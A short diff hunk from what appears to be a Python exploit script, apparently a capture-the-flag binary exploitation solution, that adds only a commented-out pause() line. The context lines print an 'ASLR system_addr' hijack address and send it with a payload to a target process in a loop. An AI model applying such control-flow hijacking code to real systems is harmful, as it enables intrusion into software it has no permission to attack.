@@ -126,6 +126,7 @@ while step < 7:
         print('ASLR system_addr', hex(hijack))
         r.sendlineafter(r_out, str(hijack))
         print('finished sending number and payload for step  %d: ' % (step))
+        # pause()
 
         step += 1
 
